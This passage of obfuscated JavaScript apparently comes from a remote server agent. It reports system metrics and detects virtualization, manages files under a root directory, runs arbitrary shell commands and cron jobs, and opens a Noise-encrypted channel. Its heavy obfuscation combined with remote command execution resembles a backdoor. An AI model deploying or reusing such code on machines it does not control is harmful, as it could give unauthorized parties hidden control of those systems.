                a0n[ax(0x466)](),
                a0n['mem'](),
                a0n[ax(0x245)](),
                a0n['currentLoad']()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = Date['now']() / 0x3e8, i = a[ax(0x458)](h, this[ax(0x1e5)]), j = a[ax(0x458)](g[ax(0x3c2)], this[ax(0x20a)]['tx']), k = a['PdgfR'](g[ax(0x3f0)], this[ax(0x20a)]['rx']);
        this[ax(0x2b5)] += j, this[ax(0x307)] += k, this[ax(0x20a)] = {
            'tx': g['tx_bytes'],
            'rx': g['rx_bytes']
        }, this[ax(0x1e5)] = h;
        const l = await a0n[ax(0x350)]();
        return {
            'cpu': { 'usage': Math['round'](b[ax(0x466)]) },
            'ram': {
                'total': c[ax(0x2a4)],
                'used': c[ax(0x304)]
            },
            'swap': {
                'total': c[ax(0x419)],
                'used': c[ax(0x24b)]
            },
            'load': {
                'load1': a[ax(0x30f)](Math['round'](f['avgLoad'] * 0x64), 0x64),
                'load5': a[ax(0x3a5)](Math[ax(0x1f4)](f[ax(0x477)] * 0x64), 0x64),
                'load15': Math[ax(0x1f4)](a[ax(0x1a7)](f[ax(0x477)], 0x64)) / 0x64
            },
            'disk': await this[ax(0x1ea)](),
            'network': {
                'up': Math[ax(0x1f4)](a[ax(0x3a5)](j, i)),
                'down': Math[ax(0x1f4)](k / i),
                'totalUp': this[ax(0x2b5)],
                'totalDown': this[ax(0x307)]
            },
            'connections': await this[ax(0x3d4)](),
            'uptime': a0k[ax(0x2ab)](),
            'process': l?.[ax(0x29f)] || 0x0,
            'message': ''
        };
    }
    async ['_getVirtualization']() {
        const ay = a0T, a = {
                'VEStI': ay(0x2c0),
                'kfbMJ': ay(0x252),
                'CgGGM': ay(0x33d),
                'OwYcT': ay(0x331),
                'rXElG': ay(0x21e),
                'GDiQw': 'Kubernetes',
                'VbiCI': ay(0x341),
                'yYYwZ': ay(0x3eb),
                'EYWZH': 'utf8',
                'oSMNN': '/docker/containers/',
                'McjVM': ay(0x256),
                'clALz': '/pods/',
                'HUPWO': ay(0x40c),
                'YtZaU': ay(0x33c),
                'lSDhS': 'container=lxc',
                'nKEOG': ay(0x384),
                'LmGCw': ay(0x2de),
                'Nbakj': ay(0x47a),
                'PTeCm': ay(0x27b)
            };
        try {
            if (a0h[ay(0x45e)](ay(0x3b5)))
                return ay(0x256);
            if (a0h[ay(0x45e)](a[ay(0x30e)]))
                return a[ay(0x425)];
            if (a0h[ay(0x45e)](a[ay(0x430)])) {
                const b = a0h['readFileSync'](a[ay(0x430)], ay(0x357))[ay(0x47b)]();
                if (b['includes'](a['OwYcT']) || b[ay(0x456)](ay(0x410)))
                    return ay(0x256);
                else {
                    if (b[ay(0x456)](a[ay(0x317)]))
                        return a[ay(0x41b)];
                    else {
                        if (b[ay(0x456)](ay(0x1d3)))
                            return a[ay(0x491)];
                    }
                }
            }
            if (a0h[ay(0x45e)](ay(0x3eb))) {
                const c = a0h[ay(0x45d)](a['yYYwZ'], a['EYWZH']);
                if (c[ay(0x456)](a['oSMNN']) || c[ay(0x456)](ay(0x1cd)))
                    return a[ay(0x3f5)];
                else {
                    if (c[ay(0x456)](a[ay(0x401)]) || c['includes'](a[ay(0x464)]))
                        return a[ay(0x41b)];
                }
            }
            if (a0h[ay(0x45e)](a[ay(0x46b)])) {
                const d = a0h['readFileSync'](ay(0x33c), a[ay(0x274)]);
                if (d['includes'](a['lSDhS']))
                    return ay(0x341);
            }
            if (a0h['existsSync'](a['nKEOG'])) {
                const f = a0h['readFileSync'](ay(0x384), a[ay(0x274)]);
                if (f[ay(0x456)](a[ay(0x351)]) || f[ay(0x456)](a[ay(0x3be)]))
                    return ay(0x2de);
            }
        } catch (g) {
        }
        return a[ay(0x269)];
    }
    async [a0T(0x1ea)]() {
        const az = a0T, a = {
                'srmQH': function (b, c) {
                    return b > c;
                },
                'EcyRd': az(0x306),
                'iincD': az(0x3ee),
                'pxQhL': '/dev/'
            };
        try {
            const b = await a0n['fsSize'](), c = b[az(0x291)](g => {
                    const aA = az;
                    return a['srmQH'](g[aA(0x213)], 0x0) && g[aA(0x1b6)] !== a[aA(0x2cb)] && g[aA(0x1b6)] !== a[aA(0x364)] && g['fs']['startsWith'](a['pxQhL']);
                }), d = c[az(0x270)]((g, h) => g + h[az(0x213)], 0x0), f = c[az(0x270)]((g, h) => g + h['used'], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0T(0x3d4)]() {
        const aB = a0T;
        try {
            const a = await a0n[aB(0x257)](), b = a[aB(0x291)](d => d[aB(0x47d)] === aB(0x22a))[aB(0x30c)], c = a[aB(0x291)](d => d['protocol'] === aB(0x340))[aB(0x30c)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0I {
    static async [a0T(0x31f)](a, b = {}) {
        const aC = a0T, c = {
                'PfBLx': function (d, f) {
                    return d || f;
                },
                'mLUZK': 'number',
                'pnAtb': function (d, f) {
                    return d(f);
                },
                'yBbIq': function (d, f) {
                    return d * f;
                },
                'cNTkA': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[aC(0x437)](),
                env: env = {},
                timeout: timeout = a0E[aC(0x3f4)]
            } = b;
        return new Promise(d => {
            const aD = aC, f = Date[aD(0x20d)](), g = a0l(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['yBbIq'](timeout, 0x3e8),
                    'maxBuffer': c['yBbIq'](c[aD(0x48c)](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const aE = aD, k = Date[aE(0x20d)]() - f, l = h && h[aE(0x1ab)] && h[aE(0x207)];
                    let m = c[aE(0x493)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            typeof h[aE(0x497)] === c[aE(0x48b)] ? n = h[aE(0x497)] : n = -0x1;
                    }
                    c['pnAtb'](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
class a0J {
    static async [a0T(0x2ac)](a, b = ![]) {
        const aF = a0T, c = {
                'WQgie': aF(0x1fe),
                'DxhOW': aF(0x35d),
                'NJFRM': function (h, i) {
                    return h(i);
                },
                'YQmbu': function (h, i) {
                    return h || i;
                },
                'QbDhp': aF(0x37c),
                'jPbIx': aF(0x250)
            }, d = a0j[aF(0x407)](a0E[aF(0x417)], c['YQmbu'](a, '.'));
        if (!d[aF(0x444)](a0E[aF(0x417)]))
            throw new Error(c[aF(0x42a)]);
        if (!a0h[aF(0x45e)](d))
            throw new Error(c[aF(0x29d)]);
        const f = [], g = h => {
                const aG = aF, i = a0h[aG(0x27c)](h);
                for (const j of i) {
                    const k = a0j[aG(0x332)](h, j), l = a0h[aG(0x1ca)](k), m = new a0A();
                    m[aG(0x292)] = j, m[aG(0x44e)] = a0j[aG(0x2a8)](a0E[aG(0x417)], k), m[aG(0x1b6)] = l[aG(0x3cd)]() ? c['WQgie'] : c[aG(0x1f0)], m[aG(0x213)] = l[aG(0x213)], m[aG(0x43a)] = l['mtime']['toISOString'](), m[aG(0x2ca)] = this[aG(0x453)](l['mode'], l[aG(0x3cd)]()), m[aG(0x402)] = '0o' + (l[aG(0x2ca)] & 0x1ff)[aG(0x48d)](0x8), m[aG(0x266)] = l[aG(0x261)] + ':' + l[aG(0x1df)], f[aG(0x298)](m), b && l[aG(0x3cd)]() && c['NJFRM'](g, k);
                }
            };
        return g(d), f;
    }
    static async [a0T(0x1e4)](a) {
        const aH = a0T, b = {
                'CKeUJ': function (d, f) {
                    return d & f;
                },
                'DNugr': aH(0x35d)
            }, c = [];
        for (const d of a) {
            const f = a0j[aH(0x407)](a0E['FILE_ROOT'], d);
            if (!f[aH(0x444)](a0E['FILE_ROOT']))
                continue;
            try {
                const g = a0h[aH(0x1ca)](f), h = this['_checkAccess'](f, a0h[aH(0x391)]['R_OK']), i = this['_checkAccess'](f, a0h['constants'][aH(0x1a4)]), j = this[aH(0x226)](f, a0h[aH(0x391)]['X_OK']), k = new a0B();
                k[aH(0x44e)] = a0j[aH(0x2a8)](a0E[aH(0x417)], f), k[aH(0x292)] = a0j[aH(0x2be)](f), k[aH(0x2ca)] = this['_formatMode'](g[aH(0x2ca)], g[aH(0x3cd)]()), k['mode_octal'] = '0o' + b[aH(0x1db)](g[aH(0x2ca)], 0x1ff)[aH(0x48d)](0x8), k[aH(0x1b6)] = g['isDirectory']() ? 'directory' : b['DNugr'], k[aH(0x217)] = h, k['writable'] = i, k[aH(0x278)] = j, c[aH(0x298)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0T(0x226)](a, b) {
        try {
            return a0h['accessSync'](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const aI = a0T, b = {
                'jmTqD': aI(0x39e),
                'OliYp': function (c, d) {
                    return c === d;
                },
                'hvZcu': 'string',
                'NdHow': function (c, d, f) {
                    return c(d, f);
                },
                'VabPT': aI(0x473)
            };
        if (typeof a === b[aI(0x31d)])
            return a;
        if (b[aI(0x404)](typeof a, b[aI(0x36f)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[aI(0x403)](c))
                return b[aI(0x2d4)](parseInt, c, 0x8);
        }
        throw new Error(b[aI(0x446)]);
    }
    static [a0T(0x453)](a, b) {
        const aJ = a0T, c = {
                'HgWSg': function (i, j) {
                    return i & j;
                },
                'KsURt': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c['HgWSg'](a, 0x1ff)[aJ(0x48d)](0x8)[aJ(0x45f)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aJ(0x405)](parseInt, i, 0xa);
            h += f[aJ(0x467)]((k, l) => j & 0x4 >> l ? k : '-')[aJ(0x332)]('');
        }
        return h;
    }
    static async [a0T(0x3d2)](a, b = ![]) {
        const aK = a0T, c = {
                'jfUfU': function (g, h) {
                    return g(h);
                },
                'rbbAj': function (g, h) {
                    return g(h);
                },
                'UbbzN': 'access_denied',
                'QgRnV': function (g, h) {
                    return g(h);
                },
                'dZNKH': aK(0x333)
            }, d = [];
        for (const [g, h] of Object[aK(0x240)](a)) {
            const i = a0j[aK(0x407)](a0E[aK(0x417)], g);
            if (!i[aK(0x444)](a0E['FILE_ROOT'])) {
                d[aK(0x298)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['UbbzN']
                });
                continue;
            }
            try {
                const j = this[aK(0x3ba)](h), k = m => {
                        const aL = aK;
                        a0h[aL(0x3e9)](m, j);
                    };
                if (b && a0h['existsSync'](i) && a0h[aK(0x1ca)](i)[aK(0x3cd)]()) {
                    const m = n => {
                        const aM = aK;
                        c[aM(0x237)](k, n);
                        const o = a0h[aM(0x27c)](n);
                        for (const p of o) {
                            const q = a0j[aM(0x332)](n, p);
                            a0h[aM(0x1ca)](q)[aM(0x3cd)]() ? c['jfUfU'](m, q) : c[aM(0x412)](k, q);
                        }
                    };
                    c[aK(0x448)](m, i);
                } else
                    k(i);
                const l = j[aK(0x48d)](0x8);
                d[aK(0x298)]({
                    'path': g,
                    'requested': c[aK(0x412)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[aK(0x298)]({
                    'path': g,
                    'requested': c[aK(0x412)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[aK(0x3d7)],
                    'message': n['message']
                });
            }
        }
        const f = d[aK(0x291)](o => o[aK(0x3de)] === 'ok')[aK(0x30c)];
        return {
            'status': 'ok',
            'total': d[aK(0x30c)],
            'success': f,
            'results': d
        };
    }
    static async [a0T(0x345)](a) {
        const aN = a0T, b = {
                'XJOiX': function (h, i) {
                    return h > i;
                },
                'hnHMu': function (h, i) {
                    return h * i;
                },
                'JszmR': 'File\x20too\x20large',
                'bNtXA': aN(0x357),
                'OXvDN': aN(0x369)
            }, c = a0j[aN(0x407)](a0E[aN(0x417)], a);
        if (!c[aN(0x444)](a0E[aN(0x417)]))
            throw new Error(aN(0x37c));
        const d = a0h['statSync'](c);
        if (b['XJOiX'](d[aN(0x213)], b[aN(0x457)](0x400, 0x400)))
            throw new Error(b['JszmR']);
        const f = a0h['readFileSync'](c), g = this[aN(0x335)](f);
        return {
            'status': 'ok',
            'path': a0j['relative'](a0E[aN(0x417)], c),
            'content': g ? a0p[aN(0x3c5)](f) : f[aN(0x48d)](b[aN(0x309)]),
            'encoding': g ? aN(0x210) : b['OXvDN'],
            'is_binary': g,
            'size': d[aN(0x213)]
        };
    }
    static ['_isBinary'](a) {
        const aO = a0T, b = {
                'fxKFj': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[aO(0x2fc)](a[aO(0x30c)], 0x0))
            return ![];
        for (let c = 0x0; c < Math[aO(0x23d)](a[aO(0x30c)], 0x200); c++) {
            if (b[aO(0x2fc)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0T(0x3c9)](a, b, c, d = null, f = null) {
        const aP = a0T, g = {
                'RenVO': function (l, m) {
                    return l > m;
                },
                'amVmQ': aP(0x29b),
                'zqaMH': function (l, m) {
                    return l !== m;
                },
                'LiSqY': function (l, m) {
                    return l !== m;
                },
                'BkUeV': function (l, m) {
                    return l(m);
                },
                'lwTDz': aP(0x40d),
                'DkzYM': '.upload_chunks',
                'KiLBQ': function (l, m) {
                    return l === m;
                }
            }, h = a0j['resolve'](a0E['FILE_ROOT'], a);
        let j = h;
        b && (j = a0j[aP(0x332)](h, b));
        if (!j[aP(0x444)](a0E[aP(0x417)]))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        !a0h[aP(0x45e)](a0j[aP(0x380)](j)) && a0h[aP(0x1a0)](a0j[aP(0x380)](j), { 'recursive': !![] });
        const k = a0p[aP(0x33e)](c);
        if (g['RenVO'](k[aP(0x30c)], a0E[aP(0x3a8)]))
            throw new Error(g['amVmQ']);
        if (g[aP(0x280)](d, null) && g[aP(0x465)](f, null)) {
            const l = Number(d), m = g[aP(0x429)](Number, f);
            if (Number[aP(0x358)](l) || Number[aP(0x358)](m))
                throw new Error(g[aP(0x1da)]);
            const n = a0j[aP(0x332)](a0j['dirname'](j), g[aP(0x26a)], a0j[aP(0x2be)](j));
            !a0h[aP(0x45e)](n) && a0h[aP(0x1a0)](n, { 'recursive': !![] });
            const o = a0j[aP(0x332)](n, 'chunk_' + l);
            a0h[aP(0x39b)](o, k);
            const p = a0h[aP(0x27c)](n)[aP(0x291)](s => s[aP(0x444)](aP(0x3bc))), q = p[aP(0x30c)], r = g[aP(0x3ec)](q, m);
            if (r) {
                const s = a0h[aP(0x271)](j);
                for (let t = 0x0; t < m; t++) {
                    const u = a0j[aP(0x332)](n, aP(0x3bc) + t);
                    if (!a0h[aP(0x45e)](u)) {
                        s[aP(0x346)]();
                        throw new Error(aP(0x496) + t);
                    }
                    s['write'](a0h['readFileSync'](u));
                }
                s['end']();
                for (const v of a0h[aP(0x27c)](n)) {
                    a0h[aP(0x378)](a0j[aP(0x332)](n, v));
                }
                a0h[aP(0x322)](n, { 'recursive': !![] });
            }
            return {
                'status': 'ok',
                'path': a0j['relative'](a0E[aP(0x417)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aP(0x39b)](j, k), {
            'status': 'ok',
            'path': a0j[aP(0x2a8)](a0E[aP(0x417)], j),
            'received': k['length'],
            'total': k[aP(0x30c)],
            'chunked': ![]
        };
    }
    static async [a0T(0x2b3)](a) {
        const aQ = a0T, b = { 'mrgqa': aQ(0x37c) }, c = a0j[aQ(0x407)](a0E[aQ(0x417)], a);
        if (!c['startsWith'](a0E[aQ(0x417)]))
            throw new Error(b['mrgqa']);
        if (!a0h[aQ(0x45e)](c))
            throw new Error(aQ(0x3cf));
        const d = a0h[aQ(0x1ca)](c), f = a0h[aQ(0x45d)](c), g = a0p[aQ(0x3c5)](f);
        return {
            'path': a0j[aQ(0x2a8)](a0E[aQ(0x417)], c),
            'content': g,
            'size': d[aQ(0x213)]
        };
    }
    static async [a0T(0x45b)](a) {
        const aR = a0T, b = {
                'VwuVq': aR(0x242),
                'OOClY': 'deleted',
                'RicTU': aR(0x325)
            }, c = [];
        for (const d of a) {
            const f = a0j[aR(0x407)](a0E[aR(0x417)], d);
            if (!f[aR(0x444)](a0E['FILE_ROOT'])) {
                c['push']({
                    'path': d,
                    'status': b[aR(0x22d)]
                });
                continue;
            }
            try {
                if (a0h[aR(0x45e)](f)) {
                    const g = a0h[aR(0x1ca)](f);
                    g[aR(0x3cd)]() ? a0h['rmdirSync'](f, { 'recursive': !![] }) : a0h[aR(0x378)](f), c[aR(0x298)]({
                        'path': d,
                        'status': b['OOClY']
                    });
                } else
                    c[aR(0x298)]({
                        'path': d,
                        'status': b['RicTU']
                    });
            } catch (h) {
                c[aR(0x298)]({
                    'path': d,
                    'status': aR(0x333),
                    'message': h[aR(0x42e)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const aS = a0T, b = {
                'QviOe': 'access_denied',
                'iNOfn': aS(0x333)
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0j['resolve'](a0E['FILE_ROOT'], d), h = a0j[aS(0x407)](a0E[aS(0x417)], f);
            if (!g['startsWith'](a0E[aS(0x417)]) || !h[aS(0x444)](a0E['FILE_ROOT'])) {
                c[aS(0x298)]({
                    'from': d,
                    'to': f,
                    'status': b[aS(0x406)]
                });
                continue;
            }
            try {
                const i = a0j['dirname'](h);
                !a0h[aS(0x45e)](i) && a0h['mkdirSync'](i, { 'recursive': !![] }), a0h[aS(0x2df)](g, h), c[aS(0x298)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[aS(0x298)]({
                    'from': d,
                    'to': f,
                    'status': b[aS(0x300)],
                    'message': j[aS(0x42e)]
                });
            }
        }
        return c;
    }
    static async [a0T(0x22c)](a) {
        const aT = a0T, b = {
                'snweP': function (d, f, g) {
                    return d(f, g);
                },
                'SUKFT': aT(0x242),
                'mdLry': aT(0x325),
                'bGMUY': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object[aT(0x240)](a)) {
            const g = a0j[aT(0x407)](a0E[aT(0x417)], d), h = a0j['resolve'](a0E[aT(0x417)], f);
            if (!g[aT(0x444)](a0E[aT(0x417)]) || !h[aT(0x444)](a0E[aT(0x417)])) {
                c[aT(0x298)]({
                    'from': d,
                    'to': f,
                    'status': b['SUKFT']
                });
                continue;
            }
            try {
                if (!a0h[aT(0x45e)](g)) {
                    c[aT(0x298)]({
                        'from': d,
                        'to': f,
                        'status': b[aT(0x41a)]
                    });
                    continue;
                }
                const i = a0j[aT(0x380)](h);
                !a0h[aT(0x45e)](i) && a0h[aT(0x1a0)](i, { 'recursive': !![] });
                const j = a0h[aT(0x1ca)](g);
                if (j['isDirectory']()) {
                    if (a0h[aT(0x2e2)])
                        a0h[aT(0x2e2)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aU = aT;
                            if (a0h['statSync'](l)[aU(0x3cd)]()) {
                                if (!a0h[aU(0x45e)](m))
                                    a0h['mkdirSync'](m, { 'recursive': !![] });
                                for (const n of a0h[aU(0x27c)](l)) {
                                    b['snweP'](k, a0j[aU(0x332)](l, n), a0j['join'](m, n));
                                }
                            } else
                                a0h[aU(0x392)](l, m);
                        };
                        b['bGMUY'](k, g, h);
                    }
                } else
                    a0h[aT(0x392)](g, h);
                c[aT(0x298)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[aT(0x298)]({
                    'from': d,
                    'to': f,
                    'status': 'error',
                    'message': l[aT(0x42e)]
                });
            }
        }
        return c;
    }
    static async [a0T(0x1ac)](a) {
        const aV = a0T, b = { 'QjiQh': 'Access\x20denied:\x20path\x20outside\x20root' }, c = a0j[aV(0x407)](a0E['FILE_ROOT'], a);
        if (!c[aV(0x444)](a0E[aV(0x417)]))
            throw new Error(b['QjiQh']);
        return a0h[aV(0x1a0)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j[aV(0x2a8)](a0E[aV(0x417)], c)
        };
    }
}
class a0K {
    static [a0T(0x3ed)] = new Map();
    static [a0T(0x21f)](a, b) {
        const aW = a0T, c = {
                'QkXoD': function (d, f) {
                    return d > f;
                },
                'JdhDP': function (d, f) {
                    return d - f;
                }
            };
        a['push'](b), c[aW(0x445)](a[aW(0x30c)], a0E[aW(0x315)]) && a[aW(0x2a9)](0x0, c[aW(0x23e)](a[aW(0x30c)], a0E[aW(0x315)]));
    }
    static [a0T(0x1c3)](a, b, c, d, f = null) {
        const aX = a0T, g = new Date()[aX(0x2f9)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + '\x20----\x20' + a + aX(0x2c9) + c + '\x0a' + (b?.[aX(0x413)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const aY = a0T;
        return {
            'status': 'ok',
            'count': a0E[aY(0x449)][aY(0x30c)],
            'tasks': a0E[aY(0x449)]
        };
    }
    static async [a0T(0x2d7)](a) {
        const aZ = a0T, b = {
                'nJUKe': 'onetime',
                'pkIPv': aZ(0x333)
            };
        a0E[aZ(0x449)] = a || [], a0E[aZ(0x36c)] = !![];
        const c = [];
        for (let d = 0x0; d < a0E[aZ(0x449)][aZ(0x30c)]; d++) {
            const f = a0E['onetasks'][d], g = await a0I[aZ(0x31f)](f), h = this[aZ(0x1c3)](f, g[aZ(0x39a)], g[aZ(0x1f5)], b[aZ(0x1ad)]);
            this['_appendLog'](a0E[aZ(0x1d1)], h), c[aZ(0x298)]({
                'index': d,
                'cmd': f,
                'exitcode': g[aZ(0x1f5)],
                'output': g['result'],
                'status': g[aZ(0x1f5)] === 0x0 ? 'ok' : b[aZ(0x2c8)]
            });
        }
        return a0E[aZ(0x36c)] = ![], {
            'status': 'ok',
            'count': a0E[aZ(0x449)][aZ(0x30c)],
            'tasks': a0E[aZ(0x449)],
            'executed': c
        };
    }
    static ['getCronTasks']() {
        const b0 = a0T;
        return {
            'status': 'ok',
            'count': Object[b0(0x2cc)](a0E[b0(0x2f2)])['length'],
            'tasks': a0E[b0(0x2f2)]
        };
    }
    static [a0T(0x34c)](a) {
        const b1 = a0T, b = {
                'sofXg': b1(0x339),
                'pBhhl': function (d, f) {
                    return d === f;
                },
                'aIIGe': function (d, f) {
                    return d || f;
                },
                'CmMlu': function (d, f) {
                    return d > f;
                },
                'eNiKQ': function (d, f) {
                    return d - f;
                },
                'vBkeY': function (d, f) {
                    return d || f;
                }
            };
        this[b1(0x3ed)][b1(0x2bd)](d => {
            const b2 = b1;
            typeof d[b2(0x43d)] === b[b2(0x44b)] && d['stop'](), b['pBhhl'](typeof d['destroy'], 'function') && d['destroy']();
        }), this[b1(0x3ed)][b1(0x1c1)]();
        const c = [];
        for (const d of Object[b1(0x2cc)](b[b1(0x1cf)](a, {}))) {
            !a0m[b1(0x45c)](d) && c[b1(0x298)](d);
        }
        if (b['CmMlu'](c['length'], 0x0))
            return {
                'status': b1(0x333),
                'message': 'Invalid\x20cron\x20expressions:\x20' + c[b1(0x332)](',\x20'),
                'valid_count': b[b1(0x3b2)](Object[b1(0x2cc)](a || {})[b1(0x30c)], c[b1(0x30c)])
            };
        a0E[b1(0x2f2)] = b['vBkeY'](a, {});
        for (const [f, g] of Object[b1(0x240)](a0E[b1(0x2f2)])) {
            const h = a0m[b1(0x334)](f, async () => {
                const b3 = b1, i = await a0I[b3(0x31f)](g), j = this[b3(0x1c3)](g, i[b3(0x39a)], i[b3(0x1f5)], b3(0x40e), f);
                this['_appendLog'](a0E[b3(0x2d2)], j);
            });
            this[b1(0x3ed)]['set'](f, h);
        }
        return a0E[b1(0x2a2)] = b['CmMlu'](Object['keys'](a0E[b1(0x2f2)])['length'], 0x0), {
            'status': 'ok',
            'count': Object[b1(0x2cc)](a0E[b1(0x2f2)])[b1(0x30c)],
            'tasks': a0E[b1(0x2f2)]
        };
    }
    static [a0T(0x34e)]() {
        const b4 = a0T;
        return {
            'onetime': {
                'pending': a0E[b4(0x36c)],
                'count': a0E[b4(0x449)]['length']
            },
            'cron': {
                'active': a0E[b4(0x2a2)],
                'count': Object[b4(0x2cc)](a0E['crontasks'])[b4(0x30c)],
                'check_interval': a0E[b4(0x219)]
            }
        };
    }
    static [a0T(0x2d6)](a = 0x32) {
        const b5 = a0T, b = a0E[b5(0x1d1)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[b5(0x30c)],
            'logs': b
        };
    }
    static [a0T(0x36e)](a = 0x32) {
        const b6 = a0T, b = a0E[b6(0x2d2)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0T(0x3a6)]() {
        const b7 = a0T, a = { 'nKezt': 'onetime' }, b = a0E[b7(0x1d1)][b7(0x30c)];
        return a0E[b7(0x1d1)] = [], {
            'status': 'ok',
            'cleared': a[b7(0x47e)]
        };
    }
    static [a0T(0x443)]() {
        const b8 = a0T, a = a0E['crontasks_log'][b8(0x30c)];
        return a0E[b8(0x2d2)] = [], {
            'status': 'ok',
            'cleared': b8(0x40e)
        };
    }
    static [a0T(0x3f6)]() {
        const b9 = a0T, a = {
                'WaOMP': function (g, h) {
                    return g - h;
                },
                'EHUwu': function (g, h) {
                    return g - h;
                }
            }, b = a0E[b9(0x1d1)][b9(0x291)](g => g[b9(0x1f5)] === 0x0)[b9(0x30c)], c = a[b9(0x2e4)](a0E[b9(0x1d1)]['length'], b), d = a0E[b9(0x2d2)][b9(0x291)](g => g[b9(0x1f5)] === 0x0)[b9(0x30c)], f = a[b9(0x227)](a0E[b9(0x2d2)][b9(0x30c)], d);
        return {
            'onetime': {
                'total_logged': a0E['onetimetasks_log']['length'],
                'max_capacity': a0E['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0E[b9(0x2d2)][b9(0x30c)],
                'max_capacity': a0E['MAX_TASK_LOG_SIZE'],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const ba = a0T, a = {
                'IZhbQ': function (c, d) {
                    return c < d;
                }
            }, b = [];
        for (let c = 0x0; a[ba(0x40f)](c, a0E[ba(0x449)][ba(0x30c)]); c++) {
            const d = a0E[ba(0x449)][c], f = await a0I['execute'](d), g = this[ba(0x1c3)](d, f[ba(0x39a)], f['exitcode'], ba(0x264));
            this['_appendLog'](a0E[ba(0x1d1)], g), b[ba(0x298)]({
                'cmd': d,
                'exitcode': f[ba(0x1f5)],
                'output': f['result'],
                'timeout': f['timeout']
            });
        }
        return a0E[ba(0x36c)] = ![], {
            'status': 'ok',
            'executed': b[ba(0x30c)],
            'results': b
        };
    }
}
let a0L = null, a0M = null;
const a0N = new Promise((a, b) => {
    const bb = a0T, c = {
            'GvctW': bb(0x343),
            'MxGUL': bb(0x212),
            'GSFbI': function (d) {
                return d();
            },
            'apNeI': bb(0x28f),
            'ScSJX': function (d, f) {
                return d(f);
            },
            'BAxhG': bb(0x20f),
            'hYdib': function (d) {
                return d();
            }
        };
    try {
        c[bb(0x434)](a0r, function (d) {
            const bc = bb;
            if (!d) {
                a0M = new Error(c['GvctW']), a0u[bc(0x295)](c[bc(0x3f1)], a0M[bc(0x42e)]), c['GSFbI'](a);
                return;
            }
            a0L = d, a0u[bc(0x3db)](c[bc(0x32b)]), c[bc(0x34a)](a);
        });
    } catch (d) {
        a0M = d, a0u['warn'](c[bb(0x3e8)], d['message']), c[bb(0x354)](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const bd = a0T, c = { 'MrtGk': 'Unhandled\x20Promise\x20Rejection:' };
    a0u[bd(0x333)](c[bd(0x31a)], a);
}), process['on'](a0T(0x218), a => {
    const be = a0T, b = { 'MwcKK': be(0x366) };
    a0u[be(0x333)](b['MwcKK'], a), process[be(0x435)](0x1);
});
class a0O {
    constructor(a, b, c) {
        const bf = a0T;
        this[bf(0x2c2)] = a, this['localPrivB64'] = b, this[bf(0x490)] = c, this[bf(0x28c)] = ![], this['hs'] = null, this[bf(0x2dc)] = null, this[bf(0x27f)] = null;
    }
    async ['init']() {
        const bg = a0T, a = {
                'imdPk': bg(0x21b),
                'lbtkY': bg(0x1e0),
                'GRHhB': bg(0x48a),
                'RShxN': bg(0x210)
            };
        await a0N;
        if (!a0L)
            throw a0M || new Error(a[bg(0x3d3)]);
        const b = a0L, c = this[bg(0x2c2)] ? b[bg(0x391)]['NOISE_ROLE_INITIATOR'] : b[bg(0x391)]['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[bg(0x21a)](a['lbtkY'], c);
        const d = Buffer[bg(0x1e7)](a[bg(0x327)]), f = this[bg(0x276)] ? Buffer['from'](this[bg(0x276)], a[bg(0x353)]) : null, g = this['expectedRemotePubB64'] ? Buffer[bg(0x1e7)](this[bg(0x490)], a[bg(0x353)]) : null;
        this['hs'][bg(0x249)](d, f, g, null);
    }
    [a0T(0x428)](a) {
        const bh = a0T, b = {
                'PWkuD': function (d, f) {
                    return d > f;
                },
                'xfLRD': function (d, f) {
                    return d === f;
                }
            };
        if (this[bh(0x28c)])
            return Buffer[bh(0x3a0)](0x0);
        const c = a0L;
